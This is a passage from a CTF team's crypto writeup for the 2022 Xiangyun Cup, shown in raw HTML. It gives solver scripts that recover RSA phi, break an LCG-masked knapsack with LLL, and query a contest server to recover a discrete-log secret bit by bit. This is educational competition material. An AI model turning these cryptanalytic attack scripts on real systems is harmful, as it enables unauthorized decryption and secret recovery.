class="string">&#x27;\n&#x27;</span>)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_phi</span>(<span class="params">c</span>):</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a, b =&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            b ,a = a,b</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;rshift1(a)&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            a&lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;rshift1(b)&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            b&lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a = a - b&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">            a=a+b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">phi = attack_phi(data)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>

<h2><span id="fill">fill</span><a href="#fill" class="header-anchor"></a></h2><p>利用lcg的三组连续输出求出参数m和c，从而得到整个序列s，反求出序列M；然后就是一个背包的破解，lll算法求最短向量即可，构造方式参考：<a href="https://www.ruanx.net/lattice-2/%EF%BC%8Cexp%EF%BC%9A">https://www.ruanx.net/lattice-2/，exp：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">M = [<span class="number">19620578458228</span>, <span class="number">39616682530092</span>, <span class="number">3004204909088</span>, <span class="number">6231457508054</span>, <span class="number">3702963666023</span>, <span class="number">48859283851499</span>, <span class="number">4385984544187</span>, <span class="number">11027662187202</span>, <span class="number">18637179189873</span>, <span class="number">29985033726663</span>, <span class="number">20689315151593</span>, <span class="number">20060155940897</span>, <span class="number">46908062454518</span>, <span class="number">8848251127828</span>, <span class="number">28637097081675</span>, <span class="number">35930247189963</span>, <span class="number">20695167327567</span>, <span class="number">36659598017280</span>, <span class="number">10923228050453</span>, <span class="number">29810039803392</span>, <span class="number">4443991557077</span>, <span class="number">31801732862419</span>, <span class="number">23368424737916</span>, <span class="number">15178683835989</span>, <span class="number">34641771567914</span>, <span class="number">44824471397533</span>, <span class="number">31243260877608</span>, <span class="number">27158599500744</span>, <span class="number">2219939459559</span>, <span class="number">20255089091807</span>, <span class="number">24667494760808</span>, <span class="number">46915118179747</span>]</span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">n = <span class="built_in">len</span>(M)</span><br><span class="line">L = matrix.zero(n + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(M):</span><br><span class="line">    L[row, row] = <span class="number">2</span></span><br><span class="line">    L[row, -<span class="number">1</span>] = x</span><br><span class="line"></span><br><span class="line">L[-<span class="number">1</span>, :] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>, -<span class="number">1</span>] = S</span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line">s0,s1,s2 = <span class="number">562734112</span>,<span class="number">859151551</span>,<span class="number">741682801</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">m = (s2-s1)*inverse(s1-s0,n)%n</span><br><span class="line">c = (s1-s0*m)%n</span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i-<span class="number">1</span>]*m+c)%n</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"><span class="comment"># 注意是反向量</span></span><br><span class="line">short = <span class="string">&#x27;00101000011000010001000010011011&#x27;</span></span><br><span class="line">short2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> short:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        short2 = short2 + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        short2 = short2 +<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(short2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(short2))</span><br><span class="line">num = <span class="built_in">int</span>(short2,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(sha256(<span class="built_in">str</span>(num).encode()).hexdigest())</span><br></pre></td></tr></table></figure>
<h2><span id="babydlp">babyDLP</span><a href="#babydlp" class="header-anchor"></a></h2><p>CryptoCTF2022的原题side step，参考春哥的解法：<a href="https://zhuanlan.zhihu.com/p/546270351">https://zhuanlan.zhihu.com/p/546270351</a> exp需要修改两个地方，1是if (‘Great!’ in a):需要加上b，其次是a &#x3D; a[9:]改为a &#x3D; a[8:] 。然后直接打即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gao</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.con = remote(<span class="string">&#x27;101.201.71.136&#x27;</span>, <span class="number">16265</span>)</span><br><span class="line">        <span class="variable language_">self</span>.p = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">2</span> ** <span class="number">234</span> - <span class="number">2</span> ** <span class="number">267</span> - <span class="number">2</span> ** <span class="number">291</span> - <span class="number">2</span> ** <span class="number">403</span> - <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.s_high = <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.Zp = Zmod(<span class="variable language_">self</span>.p)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.con.sendline(<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">        ans = <span class="variable language_">self</span>.Zp(<span class="number">4</span>).nth_root(<span class="variable language_">self</span>.s_high)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guessing: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ans))</span><br><span class="line">        <span class="variable language_">self</span>.con.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">        <span class="variable language_">self</span>.con.recvuntil(<span class="string">&#x27;integer: \n&#x27;</span>)</span><br><span class="line">        a = <span class="variable language_">self</span>.con.recvline()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&#x27;Great!&#x27;</span> <span class="keyword">in</span> a):</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="built_in">print</span>(ZZ(ans).nbits())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_one</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.con.sendline(<span class="string">b&#x27;T&#x27;</span>)</span><br><span class="line">        ans = <span class="variable language_">self</span>.Zp(<span class="number">2</span>).nth_root(<span class="variable language_">self</span>.s_high)</span><br><span class="line">        <span class="variable language_">self</span>.con.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">        <span class="variable language_">self</span>.con.recvuntil(<span class="string">b&#x27;integer: \n&#x27;</span>)</span><br><span class="line">        a = <span class="variable language_">self</span>.con.recvline()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&#x27;Great!&#x27;</span> <span class="keyword">in</span> a):</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="built_in">print</span>(ZZ(ans).nbits())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = a[<span class="number">8</span>:]</span><br><span class="line">        t, r = <span class="built_in">eval</span>(a)</span><br><span class="line">        <span class="variable language_">self</span>.s_high &lt;&lt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (t == <span class="number">0</span>):</span><br><span class="line">            <span class="variable language_">self</span>.s_high |= <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.t = <span class="number">1</span> - t</span><br><span class="line">        <span class="comment">#print(&#x27;&#123;:b&#125;&#x27;.format(self.s_high))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">self</span>.gao_one()):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">self</span>.t == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">self</span>.gao_check()):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gao_2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1023</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">self</span>.gao_one()):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                <span class="variable language_">self</span>.gao_check()</span><br><span class="line">                <span class="variable language_">self</span>.s_high &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    g = Gao()</span><br><span class="line">    g.gao_2()</span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>2022 祥云杯 SU Writeup</p><p><a href="https://team-su.github.io/posts/28616.html">https://team-su.github.io/posts/28616.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-10-31</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/">祥云杯</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/58708.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">第五届“强网”拟态防御国际精英挑战赛 SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/53642.html"><span class="level-item">2022 鹏城杯 SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>